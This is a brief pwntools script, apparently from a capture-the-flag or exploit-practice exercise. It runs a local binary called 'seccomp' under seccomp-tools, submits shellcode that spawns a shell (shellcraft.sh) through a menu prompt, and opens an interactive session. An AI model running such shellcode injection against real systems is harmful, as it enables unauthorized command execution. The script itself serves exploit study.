from pwn import *
p = process('seccomp-tools dump ./seccomp',shell=True)
p.recvuntil(b'> ')
p.sendline(b'1')
p.sendlineafter(b'shellcode: ',bytes(asm(shellcraft.sh())))
p.sendline(b'2')
p.interactive()